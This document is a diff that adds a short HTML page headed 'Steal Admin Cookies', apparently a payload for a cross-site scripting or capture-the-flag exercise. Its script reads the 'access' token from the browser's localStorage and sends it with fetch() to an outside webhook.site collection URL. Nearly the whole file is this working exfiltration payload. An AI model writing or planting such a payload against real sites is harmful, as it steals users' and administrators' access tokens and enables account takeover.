@@ -1,0 +1,11 @@
+<html>
+  <body>
+
+    <h1>Steal Admin Cookies</h1>
+
+    <script>
+      fetch("https://webhook.site/c0beb2e6-cd41-4d0b-a0e0-1f2973d2f4c1" + localStorage.getItem("access"));
+    </script>
+
+ </body>
+</html>
